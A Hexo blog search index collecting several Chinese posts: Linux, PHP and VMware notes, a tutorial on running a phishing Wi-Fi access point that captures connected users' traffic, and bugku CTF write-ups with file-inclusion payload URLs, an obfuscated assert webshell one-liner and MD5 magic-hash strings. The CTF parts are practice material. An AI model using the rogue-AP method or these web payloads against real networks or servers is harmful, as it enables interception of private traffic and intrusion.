<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[wifi渗透攻击总结]]></title>
    <url>%2F2019%2F03%2F10%2Fwifi%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[无线渗透工具介绍 kismet在终端输入kismet， 进入界面 用wireshark 打开 cap文件 GerixGerix Wifi Cracker 是另一个aircrack-ng 图形用户界面的网络破解工具。 下载Gerix软件包 wget https://bitbucket.org/SKin36/gerix-wifi-cracker-master.rar 之后解压软件包 切换到所在的目录 ，执行 python greix.py 之后按如下步骤应该是可以成功的，但是我没成功 修改配置文件第一次使用ettercap 需要修改其默认配置文件 /etc/ettercap/etter.conf需要我们把ettercap的ec_uid、ec_gid的值修改为0：以系统最高权限运行。 另外，如果系统使用了iptables防火墙，还需取消#后的注释使iptables配置生效，将： 开启ipv4 数据包转发进行iptables设置启动服务 修改 重启网络服务 服务正在启动 实战一下搭建钓鱼wifi1开启网卡的监听模式 没有网卡的同学可以关掉这个页面了 有了网卡但是kali不能识别的也可以关掉这个页面了 使用airbase-ng设置一个钓鱼AP 实际上设置一个钓鱼AP的过程是很简单的，但是钓鱼AP能不能上网就又是一个问题了 在以太网接口和无赖AP之间搭一座桥(完成桥接) 在这之前需要 apt install bridge-utils 这里总共有四块网卡 at0是一块虚拟出来的网卡， 用来做AP， 但是它不能上网 eth0是一块能够上网的网卡， 但是不能做AP lo是环回地址， 也就是127.0.0.1， 现在没啥用 wlan0mon是开启了监听模式的网卡 所以我们需要把来自at0的流量导入到eth0这一块网卡上。 至此， 钓鱼AP就已经搭建成功了， 但是你会发现上网速度真的贼鸡儿慢 观察可以看到有人连接上了 happy！接收到了传出过程中的图片 这是我在聊天的时候发出去的图片， 可以看到是两张重叠了 还有， 总结soft AP速度实在是太慢了…]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>wifi</tag>
        <tag>kali</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vmware虚拟网络连接问题]]></title>
    <url>%2F2019%2F02%2F27%2FVmware%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[写在前面朋友用VMware安装了虚拟机Ubuntu， 然而却连不上网络。 本想帮助他解决这个问题， 然而却又深感力不从心。 不过幸好不急， 临时补习了一下VMware的网络连接方式， 经过一顿猛如虎的操作之后， 成功了！ VMware虚拟机的网络结构几样东西 可以看到两个网络适配器 打开vmware虚拟机，我们可以在选项栏的“编辑”下的“虚拟网络编辑器”中看到VMnet1（仅主机模式）、VMnet8（NAT模式），那么这些都是有什么作用呢？其实，我们现在看到的VMnet0表示的是用于桥接模式下的虚拟交换机；VMnet1表示的是用于仅主机模式下的虚拟交换机；VMnet8表示的是用于NAT模式下的虚拟交换机。 三种网络连接方式 桥接方式(Bridge) 桥接方式可以说就是直接通过VMnet0 交换机连接到外网虚拟机与主机在同一个网段内， 共享相同的DNS服务器 但是这种情况下是不适合在校园网内连接的， 因为校园网每个人只分配了两个IP， 而且还不固定。 NAT 模式(地址转发模式) 这种情况下相当于自己配置了一个局域网环境， 通过一台虚拟DHCP服务器来动态配置局域网内的ip地址， VMware Network Adapter VMnet8 相当于一个网关 但是虚拟机能联通外网，不是通过VMware Network Adapter VMnet8虚拟网卡 VMware Network Adapter VMnet8虚拟网卡是用来与虚拟机通信的。 host only模式 这是一种隔离主机的方式， 所以没有对应模式的网卡。其余的与NAT模式类似 做一点补充尝试了通过ssh连接virtual box中的虚拟机 但是这个ip地址有点神奇(说实话我不太懂为啥是这个ip地址) 主机无法ping 通 这个ip （Ubuntu 安装 openssh-server) 之后 之后通过新建端口转发达到了这个目标 参考资料VMware 虚拟机连接的三种方式]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Vmware</tag>
        <tag>网络连接</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[grep使用详解]]></title>
    <url>%2F2019%2F02%2F27%2Fgrep%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[grep的来历global search regular expression and print out the line全面搜索正则表达式， 并把行打印出来还有几个 egrep 和 fgrep 命令类似 命令使用基本搜索， 显示行号， 高亮显示 grep root /etc/passwd 在/etc/passwd中搜索root， 并打印出来实现的方式可以用pipeline cat /etc/passwd | grep root 如果要显示行号， 加入 -n 选项 grep -n root /etc/passwd 加上 —color=auto 将关键字部分使用颜色显示 反向搜索加入 -v 选项 grep -v root /etc/passwdgrep -v root /etc/passwd | grep -v nologin 使用dmesg列出核心信息， 再以grep找出内含有’eth’的那一行， 并显示关键字 dmesg | grep -n —color=auto ‘eth’ 2月25号更新 grep的基本用法grep name(有无引号均可) 反向选择 -v在文件中搜索两种方式 cat 结合管道` cat /etc/passwd | grep root grep后面接文件名grep root /etc/passwd 文件搜索中的结果优化-n显示第几行 -c简单提示到底搜索到了多少行 找不到？-i不区分大小写 -Aafter-A 1即还要匹配搜索到的下一行 -Bbefore-B 1即还要匹配到搜索到的前一行 正则表达式的运用最好用引号引起来 找到了不想要的东西？-w只找词语]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>shell</tag>
        <tag>grep</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim 使用之道]]></title>
    <url>%2F2019%2F02%2F07%2Fvim-%E4%BD%BF%E7%94%A8%E4%B9%8B%E9%81%93%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[使用Linux架设服务器]]></title>
    <url>%2F2019%2F02%2F07%2F%E4%BD%BF%E7%94%A8Linux%E6%9E%B6%E8%AE%BE%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[bugku web题目的wp]]></title>
    <url>%2F2019%2F02%2F07%2Fbugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp%2F</url>
    <content type="text"><![CDATA[一直想把自己做过的bugkuctf题目汇个总， 现在终于腾出时间来啦！ welcome to bugkuctf ctrl + U查看页面源代码， 如果有 $user且 file_get_contents($user, &#39;r&#39;) 的 值是 指定的字符串。 就会 include $file 的内容 。 并且提示是 hint.php这个文件 这里涉及到一个怎么把 get 方法传入的参数作为一个文件打开。 php伪协议这里用到了 php://input 但是。。 这就要用到第二个伪协议：php://filter 我那样传递参数会报错， include($file) 只是把 $file 这个变量当作文件名包括进去了。 就是含在源代码里， 不是简单地构造一个参数就能达到的。 这就是一个泄露了源码的漏洞了。 最后构造的URL如下：http://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php 惊叹。base64 解密之后的源代码。 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 代码里面构造了一个类。公有变量是 $file 继续看一下 index.php 的源代码 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "ä¸è½ç°å¨å°±ç»ä½ flagå¦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 有几个地方暂时写不到位， 先到这里好了。 过狗一句话很蒙 1234&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 上面是题目提示的过狗一句话代码。然后…后面的不会了 字符，正则？ 前女友一道很有趣的题目， 就不说题目了， 直接放我的测试代码 123456789101112131415161718192021&lt;?phperror_reporting(0);if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; echo "$v1&lt;/br&gt;"; var_dump($v1); echo "&lt;/br&gt;"; echo md5($v1)."&lt;/br&gt;"; echo "$v2&lt;/br&gt;"; echo md5($v2)."&lt;/br&gt;"; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; echo "true"; &#125; else &#123; echo "false"; &#125;&#125;?&gt; 也是第一次发现get还能传递数组（不过当然是一堆的错误） MD5 collision还不太清楚MD5 碰撞是啥， 以后补坑 payload120.24.86.145:9009/md5.php?a=s878926199a 常用的MD5碰撞123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 秋名山老司机123456789101112&lt;head&gt;&lt;title&gt;下面的表达式的值是秋名山的车速&lt;/title&gt;&lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;p&gt;亲请在2s内计算老司机的车速是多少&lt;/p&gt;&lt;div&gt;1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;&lt;/div&gt;&lt;style&gt;div,p&#123;text-align: center;margin: 0 auto;&#125;&lt;/style&gt; 两秒之内计算出式子中的值， 再提交 菜鸡还不太会写脚本参考了dalao们的代码 123456789import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()source = s.get(url)expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()result = eval(expression)post = &#123;'value': result&#125;print(s.post(url, data = post).text) 不过还是没搞出来。 复习一下requests库 1234567import requests#构造requests对象s = requests.get(url)s.post(url, )#差不多就这些了 cookies欺骗 然而注意到URL中的line和file时就能做出来了。 1234567#用脚本把代码跑出来import requestsa=30for i in range(a): url="http://120.24.86.145:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s=requests.get(url) print s.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //看这里 $file_list[2]='keys.php'; &#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125; ?&gt; 构造cookie就行啦（然而没搞出flag来） login4CBC字节翻转攻击放一张经典的图 据师傅们的wp说是有一个index.php.swp文件存在。然而没找到， 先把师傅们找到的源码放上来 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; info = array('username'=&gt;username,'password'=&gt;password); login(info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class="login-body"&gt; &lt;div id="wrapper"&gt; &lt;div class="user-icon"&gt;&lt;/div&gt; &lt;div class="pass-icon"&gt;&lt;/div&gt; &lt;form name="login-form" class="login-form" action="" method="post"&gt; &lt;div class="header"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt; &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;input type="submit" name="submit" value="Login" class="button" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;&lt;/html&gt; 备份是个好习惯根据以前做题的经验， 备份就是在提示你 存在bak文件所以直接输入URL为 http://123.206.87.240:8002/web16/index.php.bak 然后下载文件代码： 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 做代码审计的题目， 还是主要靠自己尝试。 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);$str = strstr($_SERVER['REQUEST_URI'], '?');echo "$str"."&lt;/br&gt;";$str = substr($str, 1);echo "$str"."&lt;/br&gt;";$str = str_replace('key','', $str);echo "$str"."&lt;/br&gt;";parse_str($str);echo "$key1"."&lt;/br&gt;";echo md5($key1);echo "&lt;/br&gt;";echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2) echo 'flag';?&gt; 上面是我用来测试的代码 构造URL为 http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2输出了这些：123456?kkeyey1=1&amp;kkeyey2=2kkeyey1=1&amp;kkeyey2=2key1=1&amp;key2=21c4ca4238a0b923820dcc509a6f75849bc81e728d9d4c2f636f067f89cc14862c 之前还很疑惑为什么没有get都能得到变量， 原来是parse_str这个函数在起作用。 OK， 现在就是表演的时间了。 参考资料https://blog.csdn.net/wy_97/article/details/77431111https://www.cnblogs.com/Pinging/p/8278168.htmlhttps://blog.csdn.net/qq_19861715/article/details/79384018 https://blog.csdn.net/qq_39629343/article/details/80696263 秋名山老司机cookie欺骗CBC字节翻转攻击 python requests库学习]]></content>
      <categories>
        <category>bugkuctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>代码审计，wp</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP语法摘录]]></title>
    <url>%2F2019%2F02%2F07%2FPHP%E8%AF%AD%E6%B3%95%E6%91%98%E5%BD%95%2F</url>
    <content type="text"><![CDATA[写在前面最近在复习PHP的语法， 毕竟代码审计这方面还是比较弱。 过年的这几天也提不上学习的动力， 就只好不断地更新自己的博客比较好了 数组12345&lt;?php$cars=array("Volvo","BMW","Toyota");echo "I like " . $cars[0] . ", " . $cars[1] . " and " . $cars[2] . ".";?&gt; . 拼接字符串 PHP大致有三种类型的数组 数值数组， 和C语言的数组很相似， 键值默认从0开始 关联数组， 相当于python中的dict类型 多维数组 涉及到几个函数 获取数组的长度-count()函数遍历数值数组1234567891011&lt;?php$cars=array("Volvo","BMW","Toyota");$arrlength=count($cars);for($x=0;$x&lt;$arrlength;$x++)&#123; echo $cars[$x]; echo "&lt;br&gt;";&#125;?&gt; 遍历关联数组12345678910&lt;?php$age=array("Peter"=&gt;"35","Ben"=&gt;"37","Joe"=&gt;"43");foreach($age as $x=&gt;$x_value)&#123; echo "Key=" . $x . ", Value=" . $x_value; echo "&lt;br&gt;";&#125;?&gt; 多维数组实例： 12345678910&lt;?php// 二维数组:$cars = array( array("Volvo",100,96), array("BMW",60,59), array("Toyota",110,100));?&gt; 几个函数的区别echo函数可以一次输出多个值， echo是语言结构， 并不是真正的函数 print()打印一个值， 打印成功返回true， 打印失败返回false print_r()可以把字符串和数字简单地打印出来，而数组则以括起来的键和值得列表形式显示，并以Array开头。但print_r()输出布尔值和NULL的结果没有意义，因为都是打印”\n”。因此用var_dump()函数更适合调试。 var_dump()判断一个变量的类型与长度,并输出变量的数值,如果变量有值输的是变量的值并回返数据类型。此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。 PHP Cookie我的理解： client在请求的时候， server 端会 通过 setcookie函数 将一些键值对发送给 client端， 之后 client端 再去访问的时候就会带上 cookie 如何创建cookiesetcookie() 函数用于设置 cookie。 注释：setcookie() 函数必须位于 标签之前。 创建一个名字为 “user” 的cookie， 并赋值为 “runoob”, 并规定cookie在一小时后失效123&lt;?phpsetcookie(&quot;user&quot;, &quot;runoob&quot;, time()+3600);?&gt; 注释：在发送 cookie 时，cookie 的值会自动进行 URL 编码，在取回时进行自动解码。（为防止 URL 编码，请使用 setrawcookie() 取而代之。） 获得cookie的值PHP 的 $_COOKIE 变量用于取回 cookie 的值。 在下面的实例中，我们取回了名为 “user” 的 cookie 的值，并把它显示在了页面上：1234567&lt;?php// 输出 cookie 值echo $_COOKIE[&quot;user&quot;];// 查看所有 cookieprint_r($_COOKIE);?&gt; 可以使用 isset()函数来确定是否这是了cookie 如何删除cookie将cookie失效的时间改成过去的时间点1234&lt;?php// 设置 cookie 过期时间为过去 1 小时setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);?&gt; PHP sessionPHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。 开始PHP session首先必须启动会话 session_start()函数必须位于标签之前1234567&lt;?php session_start(); ?&gt;&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 存储session变量存储和取回 session 变量的正确方法是使用 PHP $_SESSION 变量：12345&lt;?phpsession_start();// 存储 session 数据$_SESSION[&apos;views&apos;]=1;?&gt; 创建一个简单地page-view计数器1234567891011121314&lt;?phpsession_start();if(isset($_SESSION['views']))&#123; $_SESSION['views']=$_SESSION['views']+1;&#125;else&#123; $_SESSION['views']=1;&#125;echo "浏览量：". $_SESSION['views'];?&gt; 销毁sessionunset() 函数用于释放指定的 session 变量 通过调用 session_destroy() 函数彻底销毁 session PHP过滤器简介常见的过滤器函数 filter_var() - 通过一个指定的过滤器来过滤单一的变量 filter_var_array() - 通过相同的或不同的过滤器来过滤多个变量 filter_input() - 获取一个输入变量，并对它进行过滤 filter_input_array() - 获取多个输入变量，并通过相同的或不同的过滤器对它们进行过滤 示例1： 123456789101112&lt;?php$int = 123;if(!filter_var($int, FILTER_VALIDATE_INT))&#123; echo("不是一个合法的整数");&#125;else&#123; echo("是个合法的整数");&#125;?&gt; options1234567891011121314151617181920&lt;?php$var=300;$int_options = array( "options"=&gt;array ( "min_range"=&gt;0, "max_range"=&gt;256 ));if(!filter_var($var, FILTER_VALIDATE_INT, $int_options))&#123; echo("不是一个合法的整数");&#125;else&#123; echo("是个合法的整数");&#125;?&gt; 过滤多个输入12345678910111213141516171819202122232425262728293031323334&lt;?php$filters = array( "name" =&gt; array ( "filter"=&gt;FILTER_SANITIZE_STRING ), "age" =&gt; array ( "filter"=&gt;FILTER_VALIDATE_INT, "options"=&gt;array ( "min_range"=&gt;1, "max_range"=&gt;120 ) ), "email"=&gt; FILTER_VALIDATE_EMAIL);$result = filter_input_array(INPUT_GET, $filters);if (!$result["age"])&#123; echo("年龄必须在 1 到 120 之间。&lt;br&gt;");&#125;elseif(!$result["email"])&#123; echo("E-Mail 不合法&lt;br&gt;");&#125;else&#123; echo("输入正确");&#125;?&gt; 关于form表单form表单的四种属性 action : url 地址， 服务器接收表单数据的地址 method : 提交服务器的http方法，一般为post或者get name： enctype: 表单数据提交使用的编码类型， 默认使用 “application/x-www-form-urlencoded” 如果使用的是post请求，则请求头中的 content-type 指定值就是改值。 如果表单中有上传文件， 编码类型需要使用 multipart/form-data 类型才能完成传递文件数据 浏览器提交表单时执行的步骤 1、识别出表单中表单元素的有效项，作为提交项2、构建一个表单数据集3、根据form表单中的enctype属性的值作为content-type对数据进行编码4、根据form表单中的action属性和method属性向指定的地址发送数据 四种常见的post请求提交数据的方式1.application/x-www-form-urlencoded2.multipart/form-data3.application/json4.text/xml 总算沉下心来花时间把这些东西整理了一下。 PHP， form， http， 这几样东西其实本身是联系在一起的， 可能之前学习的时候把它们忽视掉了。 参考资料菜鸟教程echo, print(), print_r(), var_dump()的区别多维数组示例Form表单、四种常见的POST请求提交数据方式]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客摘录]]></title>
    <url>%2F2019%2F02%2F05%2F%E5%8D%9A%E5%AE%A2%E6%91%98%E5%BD%95%2F</url>
    <content type="text"><![CDATA[我已经收藏了不少大佬的博客了， 可是却很少仔仔细细的全面看过， 趁着今天有点累又闲来无事， 摘录其中比较有用的内容 一些免费的翻墙软件来自刘伟的博客， 不过我筛选了一些， 因为很多已经没用了 蓝灯 优点：有免费版，并且抗封能力较强缺点：有流量限制：每月500MB，不支持iPhone、iPad系统：Linux、Windows、MacOS、Android中文：支持中文下载：蓝灯官网(需翻墙), GitHub地址(不需要翻墙) 无界 优点：无流量限制缺点：不稳定，不支持iPhone、iPad系统：Linux、Windows、Android中文：支持中文下载：无界官网(需翻墙) Tor 优点：无流量限制缺点：速度很慢，不稳定，翻墙时需使用专门的浏览器Tor Browser，不支持iPhone、iPad系统：Linux、Windows、MacOS、Android中文：网站无中文版，但软件有中文版下载：Tor官网(需翻墙) 科学上网翻墙教程 了解一下iptablesiptablesiptables命令 是Linux上常用的防火墙软件，是netfilter项目的一部分。可以直接配置，也可以通过许多前端和图形界面配置。 防火墙的策略防火墙策略一般分为两种，一种叫通策略，一种叫堵策略，通策略，默认门是关着的，必须要定义谁能进。堵策略则是，大门是洞开的，但是你必须有身份认证，否则不能进，所以通，是要全通，而堵，则是要选择。 实际例子123iptables -F # 清空所有的防火墙规则iptables -X # 删除用户自定义的空链iptables -Z # 清空计数 配置允许ssh端口连接123iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT# 22为你的ssh端口， -s 192.168.1.0/24表示允许这个网段的机器来连接，#其它网段的ip地址是登陆不了你的机器的。 -j ACCEPT表示接受这样的请求 允许本地回环地址可以正常使用 推荐几个图床 imgur(非常流行,强烈推荐): https://imgur.com SM.MS(适合国内用户,但自己很难控制图片): https://sm.ms upload.cc(繁体界面): https://upload.cc 路过图床: https://imgchr.com img9.top 无限图床: https://img9.top imgbox(英文界面): https://imgbox.com ooxx.ooo(英文界面): https://ooxx.ooo postimage(英文界面): https://postimages.org imgurl(中文界面): https://imgurl.org next主题进一步优化next主题优化 提交博客到Google和百度的方法 docker 基础知识docker基础知识总结 php命令行调试PHP 程序如何debug 检查是否有语法错误 php -l test.php 基本调试API var_dump(\$var);print_r(\$var);echo \$var; 基本的配置 display_errors、log_errors、error_reporting、error_log]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>docker</tag>
        <tag>VPN</tag>
        <tag>fq</tag>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sed命令详解]]></title>
    <url>%2F2019%2F02%2F04%2Fsed%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[abstract哪怕是除夕也要坚持更新博客 sed 简介sed 是一个很强大的文本编辑器。 可以对来自文本， 以及标准输入的文本进行编辑sed会从文件或者标准输入中读取一行，将其复制到缓冲区，对文本编辑完成之后，读取下一行直到所有的文本行都编辑完毕。 话不多说直接上示例 替换文本中的字符串 sed ‘s/book/books/‘ filename -n 打印行号， p打印。 打印出那些发生替换的行 sed -n ‘s/test/TEST/p’ filename 直接编辑文件选项-i， 匹配文件中的每一行并替换 sed -i ‘s/book/books/g’ filename 全面替换标记g sed ‘s/book/books/g’ filename 当需要从第N处开始匹配时， 可以使用/Ngecho sksksksks | sed ‘s/sk/SK/2g’ /经常被用来做定界符， 同时也可以使用任意的定界符， 如: or | 定界符出现在内部时， 需要进行转义 sed ‘s/\\/bin/\\/usr\\/local\\/bin/g’ 命令参数如下 a\\ 在当前行下面插入文本。i\\ 在当前行上面插入文本。c\\ 把选定的行改为新的文本。d 删除，删除选择的行。D 删除模板块的第一行。s 替换指定字符h 拷贝模板块的内容到内存中的缓冲区。H 追加模板块的内容到内存中的缓冲区。g 获得内存缓冲区的内容，并替代当前模板块中的文本。G 获得内存缓冲区的内容，并追加到当前模板块文本的后面。l 列表不能打印字符的清单。n 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。N 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。p 打印模板块的行。P(大写) 打印模板块的第一行。q 退出Sed。b lable 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。r file 从file中读行。t label if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。T label 错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。w file 写并追加模板块到file末尾。W file 写并追加模板块的第一行到file末尾。! 表示后面的命令对所有没有被选定的行发生作用。= 打印当前行号码。# 把注释扩展到下一个换行符以前。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[序]]></title>
    <url>%2F2019%2F02%2F04%2F%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[我总是在不断地追寻着， 却又时常忘记自己身在何方 欢迎光临百浪多息的博客！ 挂上一些友情链接 http://stackexit.cn/?tdsourcetag=s_pctim_aiomsg https://blog.szfszf.top/ https://darrenliuwei.com/ https://blankj.com/ https://sphard.com/ http://iamwr.com/ https://leaferx.online/ https://kinegratii.github.io/ http://iamwr.com/]]></content>
  </entry>
  <entry>
    <title><![CDATA[LinuxShellScrips]]></title>
    <url>%2F2019%2F02%2F04%2FLinuxShellScrips%2F</url>
    <content type="text"><![CDATA[echo命令echo嵌入变量 echo “Hello $LOGNAME, Have a nice day !” echo 使用一对双引号， 同时会把对应的变量，转化为对应的值 echo嵌入命令 echo “Your are working in directory `pwd`.” 使用一对 ` ` 在echo中嵌入命令 echo “You are working on a machine called `uname -n`.” uname -n-n, —nodename : print the network node hostname 显示时间 echo “Bye for now $LOGNAME. The time is date +%T!” date输出的结果 Mon Feb 4 09:08:50 DST 2019date +%T使用 %H:%M:%S来显示时间 echo， 单引号， 变量 planet=”Earth”echo \$planet# Earthecho ‘\$planet’# \$planetecho “\$planet”#Earth echo也可以不加单引号在屏幕上打印出 $planet echo \$planet 可以理解成单引号会里面的所有字符都会原样的打印出来， 而双引号中的变量会被对应的值取代， 不加引号和加了双引号的效果是一样的。不过同样的在双引号和不加双引号都可以用转义符。 echo与 read交互 echo Enter some textread planetecho \’\$planet\’ now equals \$planetexit 0 环境变量先来看一个恶作剧脚本 12345678910export TZ=America/Los_Angelesecho "Your Timezone is = $TZ"dateexport 